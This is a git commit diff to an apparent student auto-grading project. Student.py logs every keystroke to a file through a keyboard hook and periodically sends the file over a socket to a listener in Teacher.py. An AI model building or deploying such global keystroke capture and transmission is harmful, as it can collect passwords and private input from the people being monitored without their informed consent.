5dd9a45aabb45fd3a71d3dce5d1fc5ed527ee791
MrSummer123 <xiatiandeyu1997@126.com>
2019-02-05 19:41:26 +0800

    version2--提交方式为文件

--- Projects/AutoScorePrograming/Student.py
+++ Projects/AutoScorePrograming/Student.py
@@ -6,25 +6,29 @@ import threading
 
 
 def thread_it(func):
+
     t = threading.Thread(target=func)
     t.setDaemon(False)
     t.start()
 
 def send_record():
-        while True:
-                with open('record.txt','r') as f:
-                        li = f.readlines()
-                records = ''.join(li)
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect(('127.0.0.1', 9999))      
-                s.send(records.encode())
-                s.close()
-                time.sleep(10)
-
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            sock.connect(('127.0.0.1', 9999))
+            print('连接成功')
+        except Exception as e:
+                        # tkinter.messagebox.showerror('很抱歉', '现在不是交作业时间')
+            return        
+        with open('record.txt', 'rb') as fp:
+            sock.send(fp.read())
+        sock.close()
+        time.sleep(1800)
+    
 def onKeyboardEvent(event):
     key = event.Key
     with open('record.txt','a+') as f:
-        f.write(key+"-")
+        f.write(key+"#")
     return True
 
 def record():
--- Projects/AutoScorePrograming/Teacher.py
+++ Projects/AutoScorePrograming/Teacher.py
@@ -6,10 +6,14 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 s.bind(('127.0.0.1', 9999))
 s.listen(5)
+
+
 def tcplink(sock, addr):
-    data = sock.recv(1024)
-    print(data)
-    sock.close()
+	fp = open('record1.txt','wb')
+	filedata = sock.recv(1024)
+	fp.write(filedata)
+	fp.close()
+	sock.close()
 
 while True:
     sock, addr = s.accept()
